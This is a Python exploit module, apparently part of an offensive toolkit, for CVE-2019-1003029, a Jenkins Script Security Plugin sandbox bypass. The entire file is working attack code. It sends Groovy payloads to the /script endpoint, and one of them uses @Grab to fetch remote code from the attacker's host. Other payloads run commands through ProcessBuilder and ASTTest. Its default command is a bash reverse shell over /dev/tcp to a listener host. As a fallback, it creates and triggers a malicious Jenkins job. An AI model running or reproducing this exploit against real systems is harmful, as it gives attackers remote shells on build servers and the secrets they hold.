"""
CVE-2019-1003029: Jenkins Script Security Plugin Sandbox Bypass

This exploit leverages a sandbox bypass in the Jenkins Script Security Plugin
to execute arbitrary Groovy code on the Jenkins master.
"""

import requests
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2019-1003029"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins Script Security Sandbox Bypass",
    description="Sandbox bypass in Script Security Plugin allowing arbitrary code execution",
    affected_versions=["<= 1.53"],
    mitre_attack=["T1190", "T1059", "T1059.007"],
    severity="critical",
    references=[
        "https://jenkins.io/security/advisory/2019-03-25/",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-1003029",
        "https://www.cvedetails.com/cve/CVE-2019-1003029/"
    ],
    requires_auth=True,
    requires_crumb=True,
    tags=["rce", "sandbox-bypass", "groovy"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance is vulnerable.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/scriptApproval/"
        r = requests.get(
            url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=5
        )
        return r.status_code == 200
    except:
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2019-1003029 for sandbox bypass and RCE.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host for reverse shell
        lport: Listener port for reverse shell
        **kwargs: Additional arguments
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Script Security Sandbox Bypass)...[/yellow]")
    
    cmd = kwargs.get('cmd', f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"')
    
    groovy_payload = f'''
@GrabConfig(disableChecksums=true)
@GrabResolver(name='test', root='http://{lhost}:{lport}/')
@Grab(group='package', module='module', version='1')
import Package;
'''
    
    alternative_payloads = [
        f'''
@groovy.transform.ASTTest(value={{
    def cmd = "{cmd}".execute()
}})
def x
''',
        f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def cmd = "{cmd}"
ScriptBytecodeAdapter.asType(cmd, ProcessBuilder.class).start()
''',
        f'''
def proc = new ProcessBuilder("{cmd}".split(" ")).start()
proc.waitFor()
'''
    ]
    
    endpoints = [
        '/script',
        '/scriptText', 
        '/job/test/build',
        '/createItem'
    ]
    
    for idx, payload in enumerate([groovy_payload] + alternative_payloads):
        console.print(f"[cyan][*] Trying payload variant {idx + 1}...[/cyan]")
        
        try:
            script_url = f"{tool.jenkins_url}/script"
            
            crumb_header = {}
            if tool.crumb:
                crumb_header[tool.crumb['crumbRequestField']] = tool.crumb['crumb']
            
            headers = {**tool.custom_headers, **crumb_header}
            
            data = {
                'script': payload
            }
            
            r = requests.post(
                script_url,
                auth=tool.auth,
                headers=headers,
                data=data,
                proxies=tool.proxies,
                verify=False,
                timeout=10
            )
            
            if r.status_code == 200:
                console.print(f"[green][+] Payload executed successfully (variant {idx + 1})[/green]")
                return ExploitResult(
                    exploit=CVE_ID,
                    status="success",
                    details=f"Sandbox bypass successful using payload variant {idx + 1}",
                    data={
                        "command": cmd,
                        "payload_variant": idx + 1,
                        "endpoint": "/script"
                    }
                )
            elif r.status_code == 403:
                console.print(f"[yellow][!] Access denied (variant {idx + 1})[/yellow]")
            elif 'RejectedAccessException' in r.text or 'UnapprovedUsageException' in r.text:
                console.print(f"[yellow][!] Script rejected by sandbox (variant {idx + 1})[/yellow]")
            else:
                console.print(f"[red][-] Variant {idx + 1} failed ({r.status_code})[/red]")
                
        except Exception as e:
            console.print(f"[red][!] Error with variant {idx + 1}: {e}[/red]")
    
    try:
        job_xml = f'''<?xml version='1.0' encoding='UTF-8'?>
<project>
  <description>Test Job</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <scm class="hudson.scm.NullSCM"/>
  <canRoam>true</canRoam>
  <disabled>false</disabled>
  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
  <triggers/>
  <concurrentBuild>false</concurrentBuild>
  <builders>
    <hudson.tasks.Shell>
      <command>{cmd}</command>
    </hudson.tasks.Shell>
  </builders>
  <publishers/>
  <buildWrappers/>
</project>'''
        
        console.print("[cyan][*] Trying job creation method...[/cyan]")
        
        crumb_header = {}
        if tool.crumb:
            crumb_header[tool.crumb['crumbRequestField']] = tool.crumb['crumb']
        
        headers = {
            **tool.custom_headers,
            **crumb_header,
            'Content-Type': 'application/xml'
        }
        
        create_url = f"{tool.jenkins_url}/createItem?name=exploit_job_{CVE_ID.replace('-', '_')}"
        r = requests.post(
            create_url,
            auth=tool.auth,
            headers=headers,
            data=job_xml,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code in [200, 201]:
            console.print("[green][+] Job created, triggering build...[/green]")
            
            build_url = f"{tool.jenkins_url}/job/exploit_job_{CVE_ID.replace('-', '_')}/build"
            r = requests.post(
                build_url,
                auth=tool.auth,
                headers=headers,
                proxies=tool.proxies,
                verify=False,
                timeout=10
            )
            
            if r.status_code in [200, 201, 302]:
                return ExploitResult(
                    exploit=CVE_ID,
                    status="success",
                    details="Command executed via job creation and build trigger",
                    data={
                        "command": cmd,
                        "method": "job_creation",
                        "job_name": f"exploit_job_{CVE_ID.replace('-', '_')}"
                    }
                )
    except Exception as e:
        console.print(f"[red][!] Job creation method failed: {e}[/red]")
    
    return ExploitResult(
        exploit=CVE_ID,
        status="failed",
        details="All exploitation methods failed"
    )
